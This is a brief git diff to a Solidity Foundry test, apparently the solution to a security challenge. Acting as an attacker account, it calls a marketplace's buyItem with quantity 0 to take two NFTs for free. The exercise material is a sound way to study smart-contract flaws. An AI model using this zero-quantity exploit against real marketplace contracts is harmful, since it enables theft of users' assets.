@@ -76,6 +76,9 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
         
         // implement solution here
+        //set _quantity to 0 for free
+        bonanzaMarketplace.buyItem(address(nftA), 0, adminUser, 0);
+        bonanzaMarketplace.buyItem(address(nftB), 0, adminUser, 0);
 
         vm.stopPrank();
         validation();
